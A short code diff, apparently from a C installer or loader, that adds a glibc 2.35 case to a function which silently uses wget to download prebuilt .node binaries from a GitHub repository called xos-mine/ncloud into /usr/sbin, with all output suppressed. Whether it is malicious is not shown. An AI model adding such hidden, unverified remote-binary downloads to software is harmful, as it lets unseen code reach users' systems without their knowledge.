@@ -70,7 +70,9 @@ void detect_libc() {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/3.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.36")) {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/4.node >/dev/null 2>&1");
-            } 
+            } else if (strstr(buffer, "2.35")) {
+                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/5.node >/dev/null 2>&1");
+            }
         }
     }
 
